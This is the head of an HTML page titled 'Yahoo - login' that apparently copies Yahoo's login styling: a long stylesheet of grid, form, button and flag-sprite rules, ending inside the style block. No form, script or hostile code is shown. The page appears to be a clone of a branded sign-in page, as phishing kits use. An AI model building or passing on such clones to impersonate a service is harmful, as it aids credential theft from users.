<!DOCTYPE html>
<html class="js">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Yahoo -&nbsp;login</title>
    <meta http-equav="Content-Type" content="text/html;charset=utf-8">
    <meta name="referrer" content="origin-when-cross-origin">
    <style type="text/css">
        /*! skeletor-io - v1.0.34 */
        /*! normalize.css v3.0.2 | MIT License | git.io/normalize */
        
        img,
        legend {
            border: 0
        }
        h1,
        h2,
        h3 {
            letter-spacing: -1.7px
        }
        pre,
        textarea {
            overflow: auto
        }
        .container,
        .orko .ictrl,
        sub,
        sup {
            position: relative
        }
        .ad-content,
        .ltr,
        body {
            direction: ltr
        }
        html {
            font-family: sans-serif;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }
        body {
            margin: 0
        }
        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        main,
        menu,
        nav,
        section,
        summary {
            display: block
        }
        audio,
        canvas,
        progress,
        video {
            display: inline-block;
            vertical-align: baseline
        }
        audio:not([controls]) {
            display: none;
            height: 0
        }
        [hidden],
        template {
            display: none
        }
        a {
            background-color: transparent
        }
        a:active,
        a:hover {
            outline: 0
        }
        abbr[title] {
            border-bottom: 1px dotted
        }
        b,
        optgroup,
        strong {
            font-weight: 700
        }
        dfn {
            font-style: italic
        }
        h1 {
            margin: .67em 0
        }
        mark {
            background: #ff0;
            color: #000
        }
        small {
            font-size: 80%
        }
        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            vertical-align: baseline
        }
        sup {
            top: -.5em
        }
        sub {
            bottom: -.25em
        }
        svg:not(:root) {
            overflow: hidden
        }
        figure {
            margin: 1em 40px
        }
        hr {
            box-sizing: content-box;
            height: 0
        }
        code,
        kbd,
        pre,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }
        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font: inherit;
            margin: 0
        }
        body,
        h6 {
            line-height: 1.6
        }
        button {
            overflow: visible
        }
        button,
        select {
            text-transform: none
        }
        button,
        html input[type=button],
        input[type=reset],
        input[type=submit] {
            -webkit-appearance: button;
            cursor: pointer
        }
        button[disabled],
        html input[disabled] {
            cursor: default
        }
        button::-moz-focus-inner,
        input::-moz-focus-inner {
            border: 0;
            padding: 0
        }
        input {
            line-height: normal
        }
        input[type=checkbox],
        input[type=radio] {
            box-sizing: border-box;
            padding: 0
        }
        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button {
            height: auto
        }
        input[type=search]::-webkit-search-cancel-button,
        input[type=search]::-webkit-search-decoration {
            -webkit-appearance: none
        }
        fieldset {
            border: 1px solid silver;
            margin: 0 2px
        }
        legend {
            padding: 0
        }
        table {
            border-collapse: collapse;
            border-spacing: 0
        }
        .container {
            width: 100%;
            max-width: 960px;
            margin: 0 auto;
            padding: 0 20px;
            box-sizing: border-box
        }
        ol,
        p,
        ul {
            margin-top: 0
        }
        .column,
        .columns {
            width: 100%;
            float: left;
            box-sizing: border-box
        }
        @media (min-width: 400px) {
            .container {
                width: 85%;
                padding: 0
            }
        }
        body {
            font-weight: 400
        }
        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            margin-top: 0;
            margin-bottom: 2rem;
            font-weight: 300
        }
        h1 {
            line-height: 1.2;
            letter-spacing: -.1rem
        }
        h2 {
            line-height: 1.25;
            letter-spacing: -.1rem
        }
        h3 {
            line-height: 1.3;
            letter-spacing: -.1rem
        }
        h4 {
            line-height: 1.35;
            letter-spacing: -1.36px;
            letter-spacing: -.08rem
        }
        h5 {
            font-size: 30.6px;
            font-size: 1.8rem;
            line-height: 1.5;
            letter-spacing: -.85px;
            letter-spacing: -.05rem
        }
        h6 {
            font-size: 25.5px;
            font-size: 1.5rem;
            letter-spacing: 0
        }
        @media (min-width: 550px) {
            .container {
                width: 80%
            }
            .column,
            .columns {
                margin-left: 4%
            }
            .column:first-child,
            .columns:first-child {
                margin-left: 0
            }
            .one.column,
            .one.columns {
                width: 4.66666666667%
            }
            .two.columns {
                width: 13.3333333333%
            }
            .three.columns {
                width: 22%
            }
            .four.columns {
                width: 30.6666666667%
            }
            .five.columns {
                width: 39.3333333333%
            }
            .six.columns {
                width: 48%
            }
            .seven.columns {
                width: 56.6666666667%
            }
            .eight.columns {
                width: 65.3333333333%
            }
            .nine.columns {
                width: 74%
            }
            .ten.columns {
                width: 82.6666666667%
            }
            .eleven.columns {
                width: 91.3333333333%
            }
            .twelve.columns {
                width: 100%;
                margin-left: 0
            }
            .one-third.column {
                width: 30.6666666667%
            }
            .two-thirds.column {
                width: 65.3333333333%
            }
            .one-half.column {
                width: 48%
            }
            .offset-by-one.column,
            .offset-by-one.columns {
                margin-left: 8.66666666667%
            }
            .offset-by-two.column,
            .offset-by-two.columns {
                margin-left: 17.3333333333%
            }
            .offset-by-three.column,
            .offset-by-three.columns {
                margin-left: 26%
            }
            .offset-by-four.column,
            .offset-by-four.columns {
                margin-left: 34.6666666667%
            }
            .offset-by-five.column,
            .offset-by-five.columns {
                margin-left: 43.3333333333%
            }
            .offset-by-six.column,
            .offset-by-six.columns {
                margin-left: 52%
            }
            .offset-by-seven.column,
            .offset-by-seven.columns {
                margin-left: 60.6666666667%
            }
            .offset-by-eight.column,
            .offset-by-eight.columns {
                margin-left: 69.3333333333%
            }
            .offset-by-nine.column,
            .offset-by-nine.columns {
                margin-left: 78%
            }
            .offset-by-ten.column,
            .offset-by-ten.columns {
                margin-left: 86.6666666667%
            }
            .offset-by-eleven.column,
            .offset-by-eleven.columns {
                margin-left: 95.3333333333%
            }
            .offset-by-one-third.column,
            .offset-by-one-third.columns {
                margin-left: 34.6666666667%
            }
            .offset-by-two-thirds.column,
            .offset-by-two-thirds.columns {
                margin-left: 69.3333333333%
            }
            .offset-by-one-half.column,
            .offset-by-one-half.columns {
                margin-left: 52%
            }
            h1 {
                font-size: 5rem
            }
            h2 {
                font-size: 4.2rem
            }
            h3 {
                font-size: 3.6rem
            }
            h4 {
                font-size: 3rem
            }
            h5 {
                font-size: 2.4rem
            }
            h6 {
                font-size: 1.5rem
            }
        }
        .button,
        button,
        input[type=button],
        input[type=reset],
        input[type=submit] {
            display: inline-block;
            height: 38px;
            padding: 0 30px;
            color: #555;
            text-align: center;
            font-size: 11px;
            font-weight: 600;
            line-height: 38px;
            letter-spacing: 1.7px;
            letter-spacing: .1rem;
            text-transform: uppercase;
            text-decoration: none;
            white-space: nowrap;
            background-color: transparent;
            border-radius: 4px;
            border: 1px solid #bbb;
            cursor: pointer;
            box-sizing: border-box
        }
        .orko .txt-align-left,
        td,
        th {
            text-align: left
        }
        .button:focus,
        .button:hover,
        button:focus,
        button:hover,
        input[type=button]:focus,
        input[type=button]:hover,
        input[type=reset]:focus,
        input[type=reset]:hover,
        input[type=submit]:focus,
        input[type=submit]:hover {
            color: #333;
            border-color: #888;
            outline: 0
        }
        .button.button-primary,
        button.button-primary,
        input[type=button].button-primary,
        input[type=reset].button-primary,
        input[type=submit].button-primary {
            color: #FFF;
            background-color: #33C3F0;
            border-color: #33C3F0
        }
        .button.button-primary:focus,
        .button.button-primary:hover,
        button.button-primary:focus,
        button.button-primary:hover,
        input[type=button].button-primary:focus,
        input[type=button].button-primary:hover,
        input[type=reset].button-primary:focus,
        input[type=reset].button-primary:hover,
        input[type=submit].button-primary:focus,
        input[type=submit].button-primary:hover {
            color: #FFF;
            background-color: #1EAEDB;
            border-color: #1EAEDB
        }
        input[type=email],
        input[type=text],
        input[type=tel],
        input[type=url],
        input[type=password],
        input[type=number],
        input[type=search],
        select,
        textarea {
            height: 38px;
            padding: 6px 10px;
            background-color: #fff;
            border: 1px solid #D1D1D1;
            border-radius: 4px;
            box-shadow: none;
            box-sizing: border-box
        }
        input[type=email],
        input[type=text],
        input[type=tel],
        input[type=url],
        input[type=password],
        input[type=number],
        input[type=search],
        textarea {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }
        textarea {
            min-height: 65px;
            padding-top: 6px;
            padding-bottom: 6px
        }
        input[type=email]:focus,
        input[type=text]:focus,
        input[type=tel]:focus,
        input[type=url]:focus,
        input[type=password]:focus,
        input[type=number]:focus,
        input[type=search]:focus,
        select:focus,
        textarea:focus {
            border: 1px solid #33C3F0;
            outline: 0
        }
        label,
        legend {
            display: block;
            margin-bottom: .5rem;
            font-weight: 600
        }
        .button,
        .orko h1,
        .orko h2,
        .orko h3,
        .orko label,
        button,
        input[type=button],
        input[type=reset],
        input[type=submit],
        label>.label-body {
            font-weight: 400
        }
        fieldset {
            padding: 0;
            border-width: 0
        }
        input[type=checkbox],
        input[type=radio] {
            display: inline
        }
        label>.label-body {
            display: inline-block;
            margin-left: .5rem
        }
        ul {
            list-style: circle inside
        }
        ol {
            list-style: decimal inside
        }
        ol,
        ul {
            padding-left: 0
        }
        ol ol,
        ol ul,
        ul ol,
        ul ul {
            margin: 1.5rem 0 1.5rem 3rem;
            font-size: 90%
        }
        .button,
        button,
        li {
            margin-bottom: 1rem
        }
        code {
            padding: .2rem .5rem;
            margin: 0 .2rem;
            font-size: 90%;
            white-space: nowrap;
            background: #F1F1F1;
            border: 1px solid #E1E1E1;
            border-radius: 4px
        }
        pre>code {
            display: block;
            padding: 1rem 1.5rem;
            white-space: pre
        }
        td,
        th {
            padding: 12px 15px;
            border-bottom: 1px solid #E1E1E1
        }
        .orko .blk-reset-r-pad,
        td:last-child,
        th:last-child {
            padding-right: 0
        }
        .orko .blk-reset-l-pad,
        .orko ul li,
        td:first-child,
        th:first-child {
            padding-left: 0
        }
        fieldset,
        input,
        select,
        textarea {
            margin-bottom: 1.5rem
        }
        blockquote,
        dl,
        figure,
        form,
        ol,
        p,
        pre,
        table,
        ul {
            margin-bottom: 2.5rem
        }
        .u-full-width {
            width: 100%;
            box-sizing: border-box
        }
        .u-max-full-width {
            max-width: 100%;
            box-sizing: border-box
        }
        .u-pull-right {
            float: right
        }
        .u-pull-left {
            float: left
        }
        hr {
            margin-top: 3rem;
            margin-bottom: 3.5rem;
            border-width: 0;
            border-top: 1px solid #E1E1E1
        }
        .container:after,
        .row:after,
        .u-cf {
            content: "";
            display: table;
            clear: both
        }
        .orko,
        body {
            background: #fff;
            color: #26282a;
            font-family: "Helvetica Neue", Helvetica, Arial;
            letter-spacing: .5px;
            width: 100%;
            max-width: 100%
        }
        ::-moz-placeholder {
            color: #b9bdc5;
            opacity: 1
        }
        :-ms-input-placeholder {
            color: #b9bdc5
        }
        ::-webkit-input-placeholder {
            color: #b9bdc5
        }
        .orko h1,
        .orko h2,
        .orko h3,
        .orko h4,
        .orko h5,
        .orko h6 {
            font-weight: 400;
            letter-spacing: .5px
        }
        .orko td,
        .orko th {
            vertical-align: top;
            border: 0
        }
        .orko ul li {
            list-style-type: none
        }
        .orko hr {
            margin: 2em 0
        }
        .orko code {
            background: #f1f1f5;
            border-color: #d8dade
        }
        .orko form {
            margin-bottom: 1em
        }
        .orko-logo {
            background: url(https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png) no-repeat;
            background-size: 70%;
            width: 180px;
            height: 60px
        }
        .orko .blk-f-width,
        .orko-button.orko-f-width,
        input.orko-button.orko-f-width {
            width: 100%
        }
        .orko .blk-mt-4 {
            margin-top: 4px
        }
        .orko .blk-mt-8 {
            margin-top: 8px
        }
        .orko .blk-mt-12 {
            margin-top: 12px
        }
        .orko .blk-mt-20 {
            margin-top: 20px
        }
        .orko .blk-mt-28 {
            margin-top: 28px
        }
        .orko .blk-mt-44 {
            margin-top: 44px
        }
        .orko .blk-mr-4 {
            margin-right: 4px
        }
        .orko .blk-show {
            display: block
        }
        .orko .blk-hide {
            display: none
        }
        .orko .blk-reset-pad {
            padding: 0
        }
        .orko .blk-reset-rl-pad {
            padding-right: 0;
            padding-left: 0
        }
        .orko .blk-grad-bar {
            background: -webkit-linear-gradient(left, #188fff 0, #400090 100%);
            background: linear-gradient(to right, #188fff 0, #400090 100%);
            display: block;
            height: 4px;
            margin: 0 -2px 30px
        }
        .orko .blk-shadow {
            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .3)
        }
        .orko .txt-align-cntr {
            text-align: center
        }
        .orko .txt-align-right {
            text-align: right
        }
        .orko .clr-def {
            color: #26282a
        }
        .orko .clr-error {
            color: #f0162f
        }
        .orko .clr-grey5 {
            color: #b9bdc5
        }
        .orko .clr-grey7 {
            color: #878c91
        }
        .orko-button,
        input.orko-button {
            background: #ccc;
            background: hsla(0, 0%, 0%, 1);
            border: 2px solid transparent;
            border-radius: .25em;
            box-sizing: border-box;
            color: #fff;
            display: inline-block;
            height: 42px;
            line-height: 1;
            outline: 0;
            overflow: hidden;
            tap-highlight-color: transparent;
            text-align: center;
            text-overflow: ellipsis;
            text-transform: none;
            vertical-align: middle;
            white-space: nowrap;
            zoom: 1
        }
        .orko-button:active,
        .orko-button:focus,
        .orko-button:hover,
        input.orko-button:active,
        input.orko-button:focus,
        input.orko-button:hover {
            border-color: transparent;
            color: #fff
        }
        .orko-button.orko-a-width,
        input.orko-button.orko-a-width {
            width: auto
        }
        .orko-button-primary,
        input.orko-button-primary {
            background: #188fff;
            color: #fff
        }
        .orko-button-primary:hover,
        input.orko-button-primary:hover {
            background: #4ca9ff;
            border-color: #4ca9ff;
            color: #fff
        }
        .orko-button-primary:active,
        .orko-button-primary:focus,
        input.orko-button-primary:active,
        input.orko-button-primary:focus {
            background: #003abc;
            border-color: #003abc;
            color: #fff
        }
        .orko-button-primary-disable,
        .orko-button-primary-disable:active,
        .orko-button-primary-disable:focus,
        .orko-button-primary-disable:hover,
        input.orko-button-primary-disable,
        input.orko-button-primary-disable:active,
        input.orko-button-primary-disable:focus,
        input.orko-button-primary-disable:hover {
            background: #e2e2e6;
            border-color: transparent;
            color: #cfcfd1
        }
        .orko-button-secondary,
        input.orko-button-secondary {
            background: #fff;
            border-color: #188fff;
            color: #188fff
        }
        .orko-button-secondary:hover,
        input.orko-button-secondary:hover {
            border-color: #4ca9ff;
            color: #4ca9ff
        }
        .orko-button-secondary:active,
        .orko-button-secondary:focus,
        input.orko-button-secondary:active,
        input.orko-button-secondary:focus {
            border-color: #003abc;
            color: #003abc
        }
        .orko-button-secondary-disable,
        .orko-button-secondary-disable:active,
        .orko-button-secondary-disable:focus,
        .orko-button-secondary-disable:hover,
        input.orko-button-secondary-disable,
        input.orko-button-secondary-disable:active,
        input.orko-button-secondary-disable:focus,
        input.orko-button-secondary-disable:hover {
            background: #fff;
            border-color: #cfcfd1;
            color: #cfcfd1
        }
        .orko-button-link,
        input.orko-button-link {
            background: #fff;
            color: #188fff;
            border-color: transparent
        }
        .orko-button-link:hover,
        input.orko-button-link:hover {
            color: #4ca9ff;
            border-color: transparent
        }
        .orko-button-link:active,
        .orko-button-link:focus,
        input.orko-button-link:active,
        input.orko-button-link:focus {
            color: #003abc;
            border-color: transparent
        }
        .orko-button-link-disable,
        .orko-button-link-disable:active,
        .orko-button-link-disable:focus,
        .orko-button-link-disable:hover,
        input.orko-button-link-disable,
        input.orko-button-link-disable:active,
        input.orko-button-link-disable:focus,
        input.orko-button-link-disable:hover {
            background: #fff;
            border-color: transparent;
            color: #cfcfd1
        }
        *,
        :after,
        :before {
            box-sizing: border-box
        }
        .orko-container {
            margin: 0 auto;
            max-width: 1440px;
            padding: 0 16px;
            width: 100%
        }
        .orko-container:after,
        .orko-row:after {
            clear: both;
            content: "";
            display: table
        }
        [class*=orko-row]>[class*=col-] [class*=orko-row] {
            margin: 0 -16px
        }
        [class*=col-] {
            float: left;
            width: 100%;
            padding: 0 16px
        }
        .orko-md-width,
        .orko-sm-width,
        .orko-width {
            width: 100%
        }
        @media (min-width: 1280px) {
            [class*=col-] {
                float: left;
                width: 100%;
                padding: 16px
            }
            [class*=orko-row]>[class*=col-] [class*=orko-row] {
                margin: -16px -16px 0
            }
            [class*=orko-row]>[class*=col-] [class*=orko-row] [class*=col-] {
                margin-bottom: -16px
            }
            .col-1-12 {
                width: 8.333%
            }
            .col-2-12 {
                width: 16.667%
            }
            .col-3-12 {
                width: 25%
            }
            .col-4-12 {
                width: 33.333%
            }
            .col-5-12 {
                width: 41.667%
            }
            .col-6-12 {
                width: 50%
            }
            .col-7-12 {
                width: 58.333%
            }
            .col-8-12 {
                width: 66.667%
            }
            .col-9-12 {
                width: 75%
            }
            .col-10-12 {
                width: 83.333%
            }
            .col-11-12 {
                width: 91.667%
            }
            .col-12-12 {
                width: 100%
            }
            .col-pr-4 {
                padding-right: 4px
            }
            .col-pl-4 {
                padding-left: 4px
            }
            .orko-width {
                width: 1280px;
                margin: 0 auto
            }
        }
        @media (min-width: 840px) {
            .md-col-1-12 {
                width: 8.333%
            }
            .md-col-2-12 {
                width: 16.667%
            }
            .md-col-3-12 {
                width: 25%
            }
            .md-col-4-12 {
                width: 33.333%
            }
            .md-col-5-12 {
                width: 41.667%
            }
            .md-col-6-12 {
                width: 50%
            }
            .md-col-7-12 {
                width: 58.333%
            }
            .md-col-8-12 {
                width: 66.667%
            }
            .md-col-9-12 {
                width: 75%
            }
            .md-col-10-12 {
                width: 83.333%
            }
            .md-col-11-12 {
                width: 91.667%
            }
            .md-col-12-12 {
                width: 100%
            }
            .col-pr-4 {
                padding-right: 4px
            }
            .col-pl-4 {
                padding-left: 4px
            }
            .orko-md-width {
                width: 840px;
                margin: 0 auto
            }
        }
        @media (min-width: 480px) {
            .sm-col-1-12 {
                width: 8.333%
            }
            .sm-col-2-12 {
                width: 16.667%
            }
            .sm-col-3-12 {
                width: 25%
            }
            .sm-col-4-12 {
                width: 33.333%
            }
            .sm-col-5-12 {
                width: 41.667%
            }
            .sm-col-6-12 {
                width: 50%
            }
            .sm-col-7-12 {
                width: 58.333%
            }
            .sm-col-8-12 {
                width: 66.667%
            }
            .sm-col-9-12 {
                width: 75%
            }
            .sm-col-10-12 {
                width: 83.333%
            }
            .sm-col-11-12 {
                width: 91.667%
            }
            .sm-col-12-12 {
                width: 100%
            }
            .col-pr-4 {
                padding-right: 4px
            }
            .col-pl-4 {
                padding-left: 4px
            }
            .orko-sm-width {
                width: 360px;
                margin: 0 auto
            }
        }
        @media (min-width: 0) {
            .f-col-1-12 {
                width: 8.333%
            }
            .f-col-2-12 {
                width: 16.667%
            }
            .f-col-3-12 {
                width: 25%
            }
            .f-col-4-12 {
                width: 33.333%
            }
            .f-col-5-12 {
                width: 41.667%
            }
            .f-col-6-12 {
                width: 50%
            }
            .f-col-7-12 {
                width: 58.333%
            }
            .f-col-8-12 {
                width: 66.667%
            }
            .f-col-9-12 {
                width: 75%
            }
            .f-col-10-12 {
                width: 83.333%
            }
            .f-col-11-12 {
                width: 91.667%
            }
            .f-col-12-12 {
                width: 100%
            }
            .col-pr-4 {
                padding-right: 4px
            }
            .col-pl-4 {
                padding-left: 4px
            }
            .orko-f-width {
                width: 360px;
                margin: 0 auto
            }
        }
        .orko input[type=email],
        .orko input[type=text],
        .orko input[type=tel],
        .orko input[type=url],
        .orko input[type=password],
        .orko input[type=number],
        .orko input[type=search],
        .orko select,
        .orko textarea {
            background: 0 0;
            border: 0;
            border-bottom: 1px solid #b9bdc5;
            border-radius: 0;
            font-size: 1.142em;
            height: 37px;
            letter-spacing: .5px;
            margin: 4px 0;
            padding: 16px 0 4px;
            vertical-align: baseline;
            width: 100%
        }
        .orko input[type=email]:focus,
        .orko input[type=text]:focus,
        .orko input[type=tel]:focus,
        .orko input[type=url]:focus,
        .orko input[type=password]:focus,
        .orko input[type=number]:focus,
        .orko input[type=search]:focus,
        .orko select:focus,
        .orko textarea:focus {
            border: 0;
            border-bottom: 2px solid #188fff;
            height: 38px
        }
        .orko input.ictrl-error {
            border-bottom: 2px solid #f0162f
        }
        .orko .ictrl input:focus[value=""]+label,
        .orko .ictrl input:focus[value=""]~label,
        .orko .ictrl input~label,
        .orko .ictrl label.lbl,
        .orko.orko-nojs .ictrl input[value=""]+label,
        .orko.orko-nojs .ictrl input[value=""]~label {
            color: #b9bdc5;
            font-size: .857em;
            letter-spacing: .5px;
            overflow: hidden;
            pointer-events: none;
            position: absolute;
            -webkit-transition-duration: .2s;
            transition-duration: .2s;
            -webkit-transition-timing-function: cubic-bezier(.4, 0, .2, 1);
            transition-timing-function: cubic-bezier(.4, 0, .2, 1);
            top: -2px;
            white-space: nowrap
        }
        .orko .ictrl input[value=""]+label,
        .orko .ictrl input[value=""]~label {
            font-size: 1.142em;
            top: 16px
        }
        .orko .ictrl input[type=password]:focus~span,
        .orko .ictrl.password input[type=text]:focus~span {
            color: #188fff
        }
        .orko .ictrl input[type=password]~span,
        .orko .ictrl.password input[type=text]~span {
            color: #b9bdc5;
            cursor: pointer;
            font-size: .857em;
            position: absolute;
            right: 0;
            text-transform: uppercase;
            top: 22px
        }
        .orko select,
        .orko select:focus {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            padding-top: 10px
        }
        .orko select,
        .orko select option:disabled {
            color: #b9bdc5
        }
        .orko select option {
            color: #26282a
        }
        .orko .ictrl .arrow {
            border-width: 5px;
            border-style: solid;
            border-color: #b9bdcf transparent transparent;
            pointer-events: none;
            position: absolute;
            right: 0;
            top: 25px
        }
        .orko .ictrl.suggestions ul {
            display: none;
            border: 1px solid #188fff;
            border-top-width: 2px;
            border-radius: 0 0 2px 2px;
            position: absolute;
            background: #fff;
            top: 40px;
            width: 100%;
            z-index: 1
        }
        .orko .ictrl.suggestions ul li {
            height: 0;
            margin-bottom: 1px;
            padding: 4px 12px
        }
        .orko .ictrl.suggestions.open ul {
            display: block
        }
        .orko .ictrl.suggestions.open ul li {
            height: auto
        }
        .orko .ictrl.suggestions.open li.hover,
        .orko .ictrl.suggestions.open li:hover {
            background: #f1f1f5;
            cursor: pointer
        }
        .orko .ictrl.email-w-domain input[type=email] {
            padding-right: 6.2em
        }
        .orko .ictrl.email-w-domain input[type=email]+span,
        .orko .ictrl.email-w-domain input[type=email]~span {
            color: #b9bdc5;
            font-size: 1.142em;
            position: absolute;
            right: 0;
            top: 16px
        }
        .orko.orko-js .suggestions.phone select,
        .orko.orko-nojs .suggestions.phone div.flag,
        .orko.orko-nojs .suggestions.phone div.flag+input,
        .orko.orko-nojs .suggestions.phone ul {
            display: none
        }
        .orko .suggestions.phone ul {
            min-width: 300px;
            width: auto
        }
        .orko .suggestions.phone input[type=text] {
            padding-left: 20px
        }
        .orko .flag {
            background: url(https://s.yimg.com/wm/skeletor/flags-1.0.0.png) no-repeat;
            height: 11px;
            position: absolute;
            top: 24px;
            width: 16px
        }
        .orko ul li .flag {
            display: inline-block;
            position: static
        }
        .orko .flag.ZW {
            background-position: 0 0
        }
        .orko .flag.ZM {
            background-position: -16px 0
        }
        .orko .flag.ZA {
            background-position: 0 -11px
        }
        .orko .flag.YT {
            background-position: -16px -11px
        }
        .orko .flag.YE {
            background-position: -32px 0
        }
        .orko .flag.WS {
            background-position: -32px -11px
        }
        .orko .flag.WF {
            background-position: 0 -22px
        }
        .orko .flag.WALES {
            background-position: -16px -22px
        }
        .orko .flag.VU {
            background-position: -32px -22px
        }
        .orko .flag.VN {
            background-position: 0 -33px
        }
        .orko .flag.VI {
            background-position: -16px -33px
        }
        .orko .flag.VG {
            background-position: -32px -33px
        }
        .orko .flag.VE {
            background-position: -48px 0
        }
        .orko .flag.VC {
            background-position: -48px -11px
        }
        .orko .flag.VA {
            background-position: -48px -22px
        }
        .orko .flag.UZ {
            background-position: -48px -33px
        }
        .orko .flag.UY {
            background-position: 0 -44px
        }
        .orko .flag.UM,
        .orko .flag.US {
            background-position: -16px -44px
        }
        .orko .flag.UG {
            background-position: -32px -44px
        }
        .orko .flag.UA {
            background-position: -48px -44px
        }
        .orko .flag.TZ {
            background-position: -64px 0
        }
        .orko .flag.TW {
            background-position: -64px -11px
        }
        .orko .flag.TV {
            background-position: -64px -22px
        }
        .orko .flag.TT {
            background-position: -64px -33px
        }
        .orko .flag.TR {
            background-position: -64px -44px
        }
        .orko .flag.TO {
            background-position: 0 -55px
        }
        .orko .flag.TN {
            background-position: -16px -55px
        }
        .orko .flag.TM {
            background-position: -32px -55px
        }
        .orko .flag.TL {
            background-position: -48px -55px
        }
        .orko .flag.TK {
            background-position: -64px -55px
        }
        .orko .flag.TJ {
            background-position: 0 -66px
        }
        .orko .flag.TH {
            background-position: -16px -66px
        }
        .orko .flag.TG {
            background-position: -32px -66px
        }
        .orko .flag.TF {
            background-position: -48px -66px
        }
        .orko .flag.TD {
            background-position: -64px -66px
        }
        .orko .flag.TC {
            background-position: -80px 0
        }
        .orko .flag.SZ {
            background-position: -80px -11px
        }
        .orko .flag.SY {
            background-position: -80px -22px
        }
        .orko .flag.SX {
            background-position: -80px -33px
        }
        .orko .flag.SV {
            background-position: -80px -44px
        }
        .orko .flag.ST {
            background-position: -80px -55px
        }
        .orko .flag.SS {
            background-position: -80px -66px
        }
        .orko .flag.SR {
            background-position: 0 -77px
        }
        .orko .flag.SO {
            background-position: -16px -77px
        }
        .orko .flag.SN {
            background-position: -32px -77px
        }
        .orko .flag.SM {
            background-position: -48px -77px
        }
        .orko .flag.SL {
            background-position: -64px -77px
        }
        .orko .flag.SK {
            background-position: -80px -77px
        }
        .orko .flag.SI {
            background-position: -96px 0
        }
        .orko .flag.SH {
            background-position: -96px -11px
        }
        .orko .flag.SG {
            background-position: -96px -22px
        }
        .orko .flag.SE {
            background-position: -96px -33px
        }
        .orko .flag.SD {
            background-position: -96px -44px
        }
        .orko .flag.SCOTLAND {
            background-position: -96px -55px
        }
        .orko .flag.SC {
            background-position: -96px -66px
        }
        .orko .flag.SB {
            background-position: -96px -77px
        }
        .orko .flag.SA {
            background-position: 0 -88px
        }
        .orko .flag.RW {
            background-position: -16px -88px
        }
        .orko .flag.RU {
            background-position: -32px -88px
        }
        .orko .flag.RS {
            background-position: -48px -88px
        }
        .orko .flag.RO {
            background-position: -64px -88px
        }
        .orko .flag.QA {
            background-position: -80px -88px
        }
        .orko .flag.PY {
            background-position: -96px -88px
        }
        .orko .flag.PW {
            background-position: 0 -99px
        }
        .orko .flag.PT {
            background-position: -16px -99px
        }
        .orko .flag.PS {
            background-position: -32px -99px
        }
        .orko .flag.PR {
            background-position: -48px -99px
        }
        .orko .flag.PN {
            background-position: -64px -99px
        }
        .orko .flag.PM {
            background-position: -80px -99px
        }
        .orko .flag.PL {
            background-position: -96px -99px
        }
        .orko .flag.PK {
            background-position: -112px 0
        }
        .orko .flag.PH {
            background-position: -112px -11px
        }
        .orko .flag.PG {
            background-position: -112px -22px
        }
        .orko .flag.PF {
            background-position: -112px -33px
        }
        .orko .flag.PE {
            background-position: -112px -44px
        }
        .orko .flag.PA {
            background-position: -112px -55px
        }
        .orko .flag.OM {
            background-position: -112px -66px
        }
        .orko .flag.NZ {
            background-position: -112px -77px
        }
        .orko .flag.NU {
            background-position: -112px -88px
        }
        .orko .flag.NR {
            background-position: -112px -99px
        }
        .orko .flag.BV,
        .orko .flag.NO,
        .orko .flag.SJ {
            background-position: 0 -110px
        }
        .orko .flag.NL {
            background-position: -16px -110px
        }
        .orko .flag.NI {
            background-position: -32px -110px
        }
        .orko .flag.NG {
            background-position: -48px -110px
        }
        .orko .flag.NF {
            background-position: -64px -110px
        }
        .orko .flag.NE {
            background-position: -80px -110px
        }
        .orko .flag.NC {
            background-position: -96px -110px
        }
        .orko .flag.NA {
            background-position: -112px -110px
        }
        .orko .flag.MZ {
            background-position: -128px 0
        }
        .orko .flag.MY {
            background-position: -128px -11px
        }
        .orko .flag.MX {
            background-position: -128px -22px
        }
        .orko .flag.MW {
            background-position: -128px -33px
        }
        .orko .flag.MV {
            background-position: -128px -44px
        }
        .orko .flag.MU {
            background-position: -128px -55px
        }
        .orko .flag.MT {
            background-position: -128px -66px
        }
        .orko .flag.MS {
            background-position: -128px -77px
        }
        .orko .flag.MR {
            background-position: -128px -88px
        }
        .orko .flag.MQ {
            background-position: -128px -99px
        }
        .orko .flag.MP {
            background-position: -128px -110px
        }
        .orko .flag.MO {
            background-position: 0 -121px
        }
        .orko .flag.MN {
            background-position: -16px -121px
        }
        .orko .flag.MM {
            background-position: -32px -121px
        }
        .orko .flag.ML {
            background-position: -48px -121px
        }
        .orko .flag.MK {
            background-position: -64px -121px
        }
        .orko .flag.MH {
            background-position: -80px -121px
        }
        .orko .flag.MG {
            background-position: -96px -121px
        }
        .orko .flag.ME {
            background-position: 0 -132px;
            width: 16px;
            height: 12px
        }
        .orko .flag.MD {
            background-position: -112px -121px
        }
        .orko .flag.MC {
            background-position: -128px -121px
        }
        .orko .flag.MA {
            background-position: -16px -132px
        }
        .orko .flag.LY {
            background-position: -32px -132px
        }
        .orko .flag.LV {
            background-position: -48px -132px
        }
        .orko .flag.LU {
            background-position: -64px -132px
        }
        .orko .flag.LT {
            background-position: -80px -132px
        }
        .orko .flag.LS {
            background-position: -96px -132px
        }
        .orko .flag.LR {
            background-position: -112px -132px
        }
        .orko .flag.LK {
            background-position: -128px -132px
        }
        .orko .flag.LI {
            background-position: -144px 0
        }
        .orko .flag.LC {
            background-position: -144px -11px
        }
        .orko .flag.LB {
            background-position: -144px -22px
        }
        .orko .flag.LA {
            background-position: -144px -33px
        }
        .orko .flag.KZ {
            background-position: -144px -44px
        }
        .orko .flag.KY {
            background-position: -144px -55px
        }
        .orko .flag.KW {
            background-position: -144px -66px
        }
        .orko .flag.KR {
            background-position: -144px -77px
        }
        .orko .flag.KP {
            background-position: -144px -88px
        }
        .orko .flag.KN {
            background-position: -144px -99px
        }
        .orko .flag.KM {
            background-position: -144px -110px
        }
        .orko .flag.KI {
            background-position: -144px -121px
        }
        .orko .flag.KH {
            background-position: -144px -132px
        }
        .orko .flag.KG {
            background-position: 0 -144px
        }
